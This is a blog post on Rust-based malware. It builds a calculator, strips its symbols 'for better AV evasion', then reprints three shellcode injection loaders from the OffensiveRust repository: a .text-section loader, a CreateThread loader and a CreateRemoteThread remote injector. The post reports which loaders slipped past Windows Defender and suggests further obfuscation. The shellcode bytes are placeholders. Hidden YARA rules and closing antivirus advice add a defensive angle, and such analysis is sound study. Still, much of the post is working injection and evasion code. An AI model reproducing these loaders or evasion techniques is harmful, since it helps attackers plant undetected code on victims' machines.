        <doc-anchor-trigger class="header-anchor-trigger" to="#creating-a-rust-project">#</doc-anchor-trigger>
        <span>Creating a Rust Project</span>
    </h3>
</doc-anchor-target>
<p><code v-pre>cargo init rust_calc</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">Project Directory Structure</div>
<pre class="language-none"><code v-pre class="language-none">.
|-- src
|   |-- main.rs
|
|-- .gitignore
|-- Cargo.toml</code></pre>
</doc-codeblock></div>
<p><code v-pre>Cargo.toml</code> is the config file for cargo package manager. Dependencies and other project configurations can be defined in this file.</p>
<div class="codeblock-wrapper"><doc-codeblock line-numbers>
<div class="codeblock-title">main.rs</div>
<pre class="language-rust"><code v-pre class="language-rust">use std::io;
use std::io::Write;

fn add(num1: i32, num2: i32) -&gt; i32 {
    num1 + num2
}

fn sub(num1: i32, num2: i32) -&gt; i32 {
    num1 - num2
}

fn mul(num1: i32, num2: i32) -&gt; i32 {
    num1 * num2
}

fn div(num1: i32, num2: i32) -&gt; i32 {
    if num2 != 0 {
        return num1 / num2;
    } else {
        println!(&quot;Denominator can't be zero&quot;);
    }
    return 0
}

fn main() {
    let n1: i32;
    let n2: i32;
    let mut input_buffer = String::new();
    let mut res: i32 = 0;
    
    println!(&quot;Calculator&quot;);
    println!(&quot;1. Addition&quot;);
    println!(&quot;2. Subtraction&quot;);
    println!(&quot;3. Multiplication&quot;);
    println!(&quot;4. Division&quot;);
    print!(&quot;Enter a option : &quot;);
    io::stdout().flush();
    io::stdin().read_line(&amp;mut input_buffer).expect(&quot;Failed to read input&quot;);
    let op: i32 = input_buffer.trim().parse().expect(&quot;Input is not an integer&quot;);
    input_buffer.clear();
    print!(&quot;Enter first number : &quot;);
    io::stdout().flush();
    io::stdin().read_line(&amp;mut input_buffer).expect(&quot;Failed to read input&quot;);
    n1 = input_buffer.trim().parse().expect(&quot;Input is not an integer&quot;);
    input_buffer.clear();
    print!(&quot;Enter second number : &quot;);
    io::stdout().flush();
    io::stdin().read_line(&amp;mut input_buffer).expect(&quot;Failed to read input&quot;);
    n2 = input_buffer.trim().parse().expect(&quot;Input is not an integer&quot;);
    
    if op == 1 {    
        res = add(n1, n2);
    } else if op == 2 {
        res = sub(n1, n2);
    } else if op == 3 {
        res = mul(n1, n2);
    } else if op == 4 {
        res = div(n1, n2);
    } else {
        println!(&quot;Invalid Option&quot;);
    }
    println!(&quot;Result : {}&quot;, res);
}</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="building-the-project">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#building-the-project">#</doc-anchor-trigger>
        <span>Building the Project</span>
    </h3>
</doc-anchor-target>
<p><code v-pre>cargo run</code> to run the debug build.</p>
<p><figure class="content-center">
    <img src="https://i.imgur.com/9cfM3Ha.png" alt="calculator output">
    <figcaption class="caption">calculator output</figcaption>
</figure>
</p>
<p><code v-pre>cargo build --release</code> to build the release version. The resulting executable will be found under the <code v-pre>target\release\</code> directory. Here is the IDA disassembly of the both builds, they are almost same and both include function symbols.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Debug Build</th>
<th>Release Build</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="https://i.imgur.com/YTJQdWo.png" alt="" /></td>
<td><img src="https://i.imgur.com/dLZaqV5.png" alt="" /></td>
</tr>
</tbody>
</table>
</div>
<p>Function symbols expose so many informations in static analysis, so it should be stripped for better AV evasion. Fortunately, we just need to add a single line in Cargo.toml for stripping function symbols.</p>
<div class="codeblock-wrapper"><doc-codeblock line-numbers>
<div class="codeblock-title">Cargo.toml</div>
<pre class="language-json"><code v-pre class="language-json">[package]
name = &quot;rust_calc&quot;
version = &quot;0.1.0&quot;
edition = &quot;2021&quot;

[dependencies]

[profile.release]
strip = true</code></pre>
</doc-codeblock></div>
<p>As you can see, all the function symbols are stripped and its queit hard to understand the program flow.</p>
<p><figure class="content-center">
    <img src="https://i.imgur.com/dAStYG4.png" alt="IDA view of stripped Rust executable">
    <figcaption class="caption">IDA view of stripped Rust executable</figcaption>
</figure>
</p>
<p>Here is the size of different build variants with default optimization.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Size</th>
<th>Build Type</th>
</tr>
</thead>
<tbody>
<tr>
<td>5 MB</td>
<td>Debug (unoptimized)</td>
</tr>
<tr>
<td>4.8 MB</td>
<td>Release (optimized + non-stripped)</td>
</tr>
<tr>
<td>~1 MB</td>
<td>Release (optimized + stripped)</td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="testing-malware-samples">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#testing-malware-samples">#</doc-anchor-trigger>
        <span>Testing Malware Samples</span>
    </h2>
</doc-anchor-target>
<hr>
<p><figure class="content-center">
    <img src="https://media.makeameme.org/created/a-computer-virus-34026ea93e.jpg" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>In this section, we are going to test the classic <code v-pre>Process Injection</code> technique.
Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process&#x27;s memory, system/network resources, and possibly elevated privileges - <em><a href="https://attack.mitre.org/techniques/T1055/">MITRE T1055</a></em></p>
<p>There are many samples with different types of techniques in OffensiveRust github repo, testing them all will make this blog super lengthy. For now, let&#x27;s test the <code v-pre>Local Process Injection</code> and <code v-pre>Remote Process Injection</code> samples.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">Windows Defender Information | Get-MpComputerStatus</div>
<pre class="language-none"><code v-pre class="language-none">AMEngineVersion                  : 1.1.20000.2
AMProductVersion                 : 4.18.2301.6
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2301.6
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 19-02-2023 13:33:44
AntispywareSignatureVersion      : 1.383.254.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 19-02-2023 13:33:44
AntivirusSignatureVersion        : 1.383.254.0
BehaviorMonitorEnabled           : True
ComputerState                    : 0
DefenderSignaturesOutOfDate      : False
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
NISEnabled                       : True
NISEngineVersion                 : 1.1.20000.2
NISSignatureAge                  : 0
NISSignatureLastUpdated          : 19-02-2023 13:33:44
NISSignatureVersion              : 1.383.254.0
OnAccessProtectionEnabled        : True
ProductStatus                    : 524288
RealTimeProtectionEnabled        : True</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="local-process-injection">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#local-process-injection">#</doc-anchor-trigger>
        <span>Local Process Injection</span>
    </h3>
</doc-anchor-target>
<p>Source : <a href="https://github.com/trickster0/OffensiveRust/tree/master/Shellcode_Local_inject">OffensiveRust - Shellcode_Local_Inject</a></p>
<p>This is the most basic process injection, saving shellcode in the <code v-pre>.text</code> section of the program and execute it without any API calls.</p>
<div class="codeblock-wrapper"><doc-codeblock line-numbers>
<div class="codeblock-title">main.rs</div>
<pre class="language-rust"><code v-pre class="language-rust">use std::mem;

#[no_mangle]
#[link_section = &quot;.text&quot;]

// msfvenom -p windows/x64/exec CMD=calc.exe -f c
static SHELLCODE : [u8;276] = *b&quot;SHELLCODEHERE&quot;;

fn main() {
  let exec_data: extern &quot;C&quot; fn () -&gt; ! = unsafe { mem::transmute(&amp;SHELLCODE as *const _ as *const ()) };
  exec_data();
}</code></pre>
</doc-codeblock></div>
<p>Windows Defender easily caught our sample the moment it touched the disk, No wonder because we are putting plain metasploit shellcode in the <code v-pre>.text</code> section. Metasploit shellcodes are highly signatured, so its pretty hard to get them running most of the time.</p>
<p><figure class="content-center">
    <img src="../../assets/videos/local1.gif" alt="Shellcode Local Inject">
    <figcaption class="caption">Shellcode Local Inject</figcaption>
</figure>
</p>
<p>Local Process Injection - Shellcode Local Inject Workflow :-</p>
<ul>
<li>The <code v-pre>no_mangle</code> macro disables symbol name encoding, <em>mangling is the encoding of function and variable names into unique names so that linkers can separate common names in the language. Disabling it is essential for unsafe C codes to access the shellcode</em>.</li>
<li><code v-pre>link_section</code> specifies the section to use for a function or static, in our sample the shellcode is saved in the <code v-pre>.text</code> section and As a result, no need to create any RWX memory for our shellcode.</li>
<li>Finally the function casting <code v-pre>exec_data</code> eliminates the need for using Windows APIs calls like <code v-pre>CreateThread</code> etc.</li>
</ul>
<p><figure class="content-center">
    <img src="https://i.imgur.com/juj11Kj.png" alt="Shellcode in .text section, starts at offset 0xcb6 and ends at offset 0xdc9">
    <figcaption class="caption">Shellcode in <code v-pre>.text</code> section, starts at offset <code v-pre>0xcb6</code> and ends at offset <code v-pre>0xdc9</code></figcaption>
</figure>
</p>
<p>Let&#x27;s do another test, this time using Windows APIs.</p>
<p>Source : <a href="https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread">OffensiveRust - Process Injection Create Thread</a></p>
<div class="codeblock-wrapper"><doc-codeblock line-numbers>
<div class="codeblock-title">Cargo.toml</div>
<pre class="language-json"><code v-pre class="language-json">[package]
name = &quot;rust_local_inject&quot;
version = &quot;0.1.0&quot;
edition = &quot;2021&quot;

[dependencies]
kernel32-sys = &quot;0.2.2&quot;
winapi = {version = &quot;0.3.8&quot;, features=[
    &quot;winnt&quot;,
    &quot;memoryapi&quot;,
    &quot;errhandlingapi&quot;,
    &quot;processthreadsapi&quot;,
    &quot;synchapi&quot;,
    &quot;winbase&quot;,
    &quot;handleapi&quot;,
    &quot;libloaderapi&quot;
]}
winreg = &quot;0.10&quot;
argparse = &quot;0.2.2&quot;
clap = &quot;3.1.5&quot;</code></pre>
</doc-codeblock></div>
<div class="codeblock-wrapper"><doc-codeblock line-numbers>
<div class="codeblock-title">main.rs</div>
<pre class="language-rust"><code v-pre class="language-rust">use winapi::um::winnt::{PVOID, PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ};
use std::ptr;
use std::io;
use std::io::prelude::*;
use std::io::{stdin, stdout, Read, Write};
use winapi::um::errhandlingapi;
use winapi::um::processthreadsapi;
use winapi::um::winbase;
use winapi::um::synchapi::WaitForSingleObject;
use std::process;

type DWORD = u32;

fn main(){
    create_thread()
}

fn create_thread() {

    //┌──(kali㉿kali)-[~/Desktop]
    //└─$ msfvenom -p windows/x64/exec CMD=&quot;calc.exe&quot; -f csharp
    let test : [u8;276] = [SHELLCODEGOESHERE];


    // allocate base addr as RW
   unsafe{
        let base_addr = kernel32::VirtualAlloc(
            ptr::null_mut(),
            test.len().try_into().unwrap(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
       
        if base_addr.is_null() { 
            println!(&quot;[-] Couldn't allocate memory to current proc.&quot;)
        } else {
            println!(&quot;[+] Allocated memory to current proc.&quot;);
        }

        // copy shellcode into mem
        println!(&quot;[*] Copying Shellcode to address in current proc.&quot;);

        std::ptr::copy(test.as_ptr() as  _, base_addr, test.len());

        println!(&quot;[*] Copied...&quot;);

        // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`

        println!(&quot;[*] Changing mem protections to RX...&quot;);

        let mut old_protect: DWORD = PAGE_READWRITE;

        let mem_protect = kernel32::VirtualProtect (
            base_addr,
            test.len() as u64,
            PAGE_EXECUTE_READ,
            &amp;mut old_protect
        );

        if mem_protect == 0 {
            let error = errhandlingapi::GetLastError();
            println!(&quot;[-] Error: {}&quot;, error.to_string());
            process::exit(0x0100);
        }
        
        // Call CreateThread
        println!(&quot;[*] Calling CreateThread...&quot;);

        let mut tid = 0;
        let ep: extern &quot;system&quot; fn(PVOID) -&gt; u32 = { std::mem::transmute(base_addr) };

        let h_thread = processthreadsapi::CreateThread(
            ptr::null_mut(),
            0,
            Some(ep),
            ptr::null_mut(),
            0,
            &amp;mut tid
        );

        if h_thread.is_null() {
            let error = unsafe { errhandlingapi::GetLastError() };
            println!(&quot;{}&quot;, error.to_string())
        
        } else {
            println!(&quot;[+] Thread Id: {}&quot;, tid)
        }

        // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running

        println!(&quot;[*] Calling WaitForSingleObject...&quot;);

        let status = WaitForSingleObject(h_thread, winbase::INFINITE);
        if status == 0 {
            println!(&quot;[+] Good!&quot;)
        } else {
            let error = errhandlingapi::GetLastError();
            println!(&quot;{}&quot;, error.to_string())
        }
    }
}</code></pre>
</doc-codeblock></div>
<p>Local Process Injection - CreateThread Workflow :-</p>
<ul>
<li><code v-pre>VirtualAlloc</code> allocates memory for shellcode with Read Write Permission on the current process</li>
<li>Copy the shellcode to allocated memory</li>
<li>Change the shellcode memory permission/protection to Read Execute using <code v-pre>VirtualProtect</code></li>
<li>Create a new Thread using <code v-pre>CreateThread</code> with the base address pointing to shellcode memory</li>
<li>Finally call <code v-pre>WaitForSingleObject</code> to keep the thread running infinitely</li>
</ul>
<p>This sample really impressed me, same shellcode but this time shellcode is in stack memory. Literally no detection, the power of Rust obfuscation is really visible here. Windows Defender static analysis were easily defeated.</p>
<p><figure class="content-center">
    <img src="../../assets/videos/local2.gif" alt="Create Thread">
    <figcaption class="caption">Create Thread</figcaption>
</figure>
</p>
<!--

Next question would be : how can we identify this type of Malware !?

Well, I ran strings on the sample and it wasn't that hard to identify the Windows API functions and also rust programs usually have the strings of their library file and compiler info , like `rustc`, `../src/lib.rs` etc, these can be used for identification as well. Even after using strip option function names were exposed, I guess it has to do with the crates we used.

![strings](https://i.imgur.com/4z9lnEg.png)

```json local_inject.yara
rule rust_local_inject : trojan
{
	meta:
		description = "Rust Malware"
		threat_level = 5
		in_the_wild = false
	strings:
        $compiler = "rustc"
		$a = "VirtualAlloc" fullword ascii
		$b = "VirtualProtect" fullword ascii
		$c = "CreateThread" fullword ascii
	condition:
		uint16(0) == 0x5A4D and filesize < 20000KB and $compiler and any of them
}
```
-->
<p>Finding the correct function in IDA was a bit of annoying, but we can see the shellcode and all other function calls there.</p>
<p><figure class="content-center">
    <img src="../../assets/videos/local3.gif" alt="IDA view of CreateThread">
    <figcaption class="caption">IDA view of CreateThread</figcaption>
</figure>
</p>
<p>That&#x27;s all for Local Process Injection, to make things even harder we can use several types of obfuscations on strings and shellcodes, hide the Windows API function traces by manually implementing them and so on. <a href="https://www.secureideas.com/blog/how-to-obfuscate-strings-in-rust-the-easy-way-using-the-litcrypt-crate">litcrypt crate</a> is an example for string obfuscation.</p>
<doc-anchor-target id="remote-process-injection">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#remote-process-injection">#</doc-anchor-trigger>
        <span>Remote Process Injection</span>
    </h3>
</doc-anchor-target>
<p>Remote Process Injection is quiet different from the Local Process Injection. In this technique we are loading shellcode or DLL into the memory space of a running process and execute in its context. Imagine <span class="docs-emoji">&#x1F601;</span></p>
<p><figure class="content-center">
    <img src="https://i.redd.it/5rli0pyhrdx71.jpg" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Source : <a href="https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateRemoteThread">OffensiveRust - Process_Injection_CreateRemoteThread</a></p>
<div class="codeblock-wrapper"><doc-codeblock line-numbers>
<pre class="language-rust"><code v-pre class="language-rust">extern crate kernel32;
use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
use winapi::um::tlhelp32::{TH32CS_SNAPPROCESS, Process32First, Process32Next, CreateToolhelp32Snapshot};
use winapi::um::handleapi::CloseHandle;
use winapi::um::tlhelp32::PROCESSENTRY32;
use std::ptr;
use std::env;
use std::ffi::CString;
use std::process;
use std::convert::TryInto;
use winapi::um::winuser::MessageBoxA;
use std::{thread, time};

// Find Process ID , I chose the C++ way of doing this, ofcourse you can use rust crates to do the same job
fn find_proc_id(proc_name: &amp;str) -&gt; u32 {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if h_snapshot == ptr::null_mut() {
        return 0;
    }

    let mut pe =  PROCESSENTRY32 {
        dwSize: std::mem::size_of::&lt;PROCESSENTRY32&gt;() as u32,
        cntUsage: 0,
        th32ProcessID: 0,
        th32DefaultHeapID: 0,
        th32ModuleID: 0,
        cntThreads: 0,
        th32ParentProcessID: 0,
        pcPriClassBase: 0,
        dwFlags: 0,
        szExeFile: [0; 260],
    };

    let h_result = unsafe { Process32First(h_snapshot, &amp;mut pe) };
    if h_result == 0 {
        unsafe { CloseHandle(h_snapshot) };
        return 0;
    }

    let proc_name = CString::new(proc_name).unwrap();
    let mut pid: u32 = 0;

    while h_result != 0 {
        let exe_file = unsafe { std::ffi::CStr::from_ptr(pe.szExeFile.as_ptr()) };
        if exe_file.to_str().unwrap() == proc_name.to_str().unwrap() {
            pid = pe.th32ProcessID;
            break;
        }
        let h_result = unsafe { Process32Next(h_snapshot, &amp;mut pe) };
    }

    unsafe { CloseHandle(h_snapshot) };
    pid
}


fn remote_injection() {
    let shellcode : [u8; SHELLCODESIZE] = [SHELLCODEGOESHERE];
    let args: Vec&lt;String&gt; = env::args().collect();
    let pid = find_proc_id(&amp;args[1]);
    let mut tid = 0;
    println!(&quot;[+] Found Process ID : {}&quot;, pid);
    let h_process = unsafe {kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid)};
    println!(&quot;[+] Found Process Handle for process {} : {:?}&quot;, pid, &amp;h_process);
    let base_addr = unsafe {kernel32::VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)};
    println!(&quot;[+] Allocated {} bytes of memory for shellcode&quot;, shellcode.len());
    let mut nbytes = 0;
    unsafe {kernel32::WriteProcessMemory(h_process, base_addr, shellcode.as_ptr() as _, shellcode.len() as u64, &amp;mut nbytes);}
    println!(&quot;[+] Copied shellcode to process memory &quot;);
    let h_thread = unsafe {kernel32::CreateRemoteThread(h_process, ptr::null_mut(), 0, Some(std::mem::transmute(base_addr)), ptr::null_mut(), 0, &amp;mut tid)};
    println!(&quot;[+] Thead Created \n Thread ID : {}&quot;, tid);
    unsafe {kernel32::CloseHandle(h_process);}
}

fn main() {
    remote_injection();
    unsafe {MessageBoxA(ptr::null_mut(),&quot;HAHAHA , Your System is Hacked\0&quot;.as_ptr() as *const i8,&quot;Owned Boiii\0&quot;.as_ptr() as *const i8,0x00004000);}
}</code></pre>
</doc-codeblock></div>
<p>Remote Process Injection - CreateRemoteThread Workflow :-</p>
<ul>
<li>We input a process name in command-line arguement to our sample , eg:- <code v-pre>rust_mal.exe notepad.exe</code></li>
<li>The pid of given process is looked up with the help of <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a> Windows API function</li>
<li><code v-pre>OpenProcess</code> opens the given remote process with <code v-pre>PROCESS_ALL_ACCESS</code> (Gives all possible access rights)</li>
<li><code v-pre>VirtualAllocEx</code> allocate memory in the remote process with RWX permission</li>
<li>Write shellcode to the allocated memory using <code v-pre>WriteProcessMemory</code></li>
<li>Create a thread in the remote process with <code v-pre>CreateRemoteThread</code> function, just like in previous sample we point the base address to the shellcode memory</li>
<li>Finally close the process handle</li>
</ul>
<p>In the latest Windows Defender update this sample was easily caught, but when I tested this sample before <code v-pre>14/02/2023</code> it was working rather well.</p>
<video controls>
<source src="/assets/videos/rust_remote_thread.mp4" type="video/mp4">
</video>
<br>
<!--

```json remote_inject.yara
rule rust_malware : trojan
{
	meta:
		description = "Rust Malware"
		threat_level = 5
		in_the_wild = false
	strings:
        $compiler = "rustc"
		$a = "NtOpenProcess" fullword ascii
		$b = "OpenProcess" fullword ascii
		$c = "VirtualAllocEx" fullword ascii
		$d = "CreateRemoteThread" fullword ascii
	condition:
		uint16(0) == 0x5A4D and filesize < 20000KB and $compiler and any of them
}
```
-->
<doc-anchor-target id="final-thoughts">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#final-thoughts">#</doc-anchor-trigger>
        <span>Final Thoughts</span>
    </h2>
</doc-anchor-target>
<div class="flex mb-6">
    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-300"></div>
    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
        <div class="flex items-center ml-4 h-7">
            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-300" width="22" height="22" viewBox="0 0 24 24" role="presentation">
                <g fill="currentColor"><g>
                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
                    <path fill="none" d="M0 0h24v24H0z"></path>
                </g></g>
            </svg>
        </div>
        <div class="pr-5 ml-3 w-full">
<p>When I tested each of these samples with Avast Free Antivirus, all of them were caught instantly. Its anti-exploit protection is impressive. Of course, highly sophisticated threat actors won&#x27;t use these simple methods, but at least it can prevent skiddies.</p>
        </div>
    </div>
</div>
<p>To be honest, I was scared to see these samples in action. Rust&#x27;s ability to bypass static analysis and even behavior analysis against Windows Defender is really impressive. I suggest you to install a better antivirus program such as Avast, Norton, etc. and also avoid running untrusted programs. On top of that, use a Firewall as well for better protection.</p>
<p><figure class="content-center">
    <img src="../../assets/img/rust_malware/firewall.png" alt="Simplewall Firewall">
    <figcaption class="caption">Simplewall Firewall</figcaption>
</figure>
</p>
<p>Thank you for taking the time to read my article. I hope it provided you with valuable insights and new knowledge. If you found it enjoyable and informative, I would greatly appreciate it if you could share it with your friends and connections. Your support means a lot to me.</p>
<doc-anchor-target id="references">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#references">#</doc-anchor-trigger>
        <span>References</span>
    </h2>
</doc-anchor-target>
<p><a href="https://rayoflightz.github.io/re/rust/2020/05/19/Bite-Sized-Rust-RE-1-Deconstructing-Hello-World.html">https://rayoflightz.github.io/re/rust/2020/05/19/Bite-Sized-Rust-RE-1-Deconstructing-Hello-World.html</a><br>
<a href="https://www.pwnthebox.net/rust/2020/11/01/deciphering-no-mangle.html">https://www.pwnthebox.net/rust/2020/11/01/deciphering-no-mangle.html</a><br>
<a href="https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html">https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html</a><br>
<a href="https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html">https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html</a></p>

                                <div class="flex items-center mt-6 mb-6 clear-both">
                                    <span>
                                        <a href="../../tags/">
                                            <svg class="inline-block -mb-px mr-1.5 text-blue-500 dark:text-blue-400" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" overflow="visible" fill="currentColor"><g><path d="M21.3 9.88l-8.59-8.59C12.52 1.11 12.27 1 12 1H2c-.55 0-1 .45-1 1v10c0 .27.11.52.29.71l8.59 8.58c.57.57 1.32.88 2.12.88s1.55-.31 2.12-.88l7.17-7.17a3.009 3.009 0 00.01-4.24zm-1.42 2.82l-7.17 7.17c-.39.39-1.02.39-1.42 0L3 11.59V3h8.59l8.29 8.29c.39.39.39 1.03 0 1.41z" /><path d="M7.01 6C6.45 6 6 6.45 6 7s.45 1 1 1 1-.45 1-1-.44-1-.99-1z" /></g></svg>
                                        </a>
                                        <span class="mr-2"><a href="../../tags/malware-analysis/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
                                    <span>malware analysis</span>
                                </a></span>
                                        <span class="mr-2"><a href="../../tags/threat-hunting/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
                                    <span>threat hunting</span>
                                </a></span>
                                        <span class="mr-2"><a href="../../tags/threat-intelligence/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
                                    <span>threat intelligence</span>
                                </a></span>
                                    </span>
                                </div>
                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../lab-setups/ad_lab/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Active Directory Lab</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../malware-analysis/reverse_android/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Reversing Android Malware</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© 2024 - <a href="https://nxb1t.is-a.dev">nxb1t.is-a.dev</a> - All rights reserved</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "A Closer Look At Rust Based Malware", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
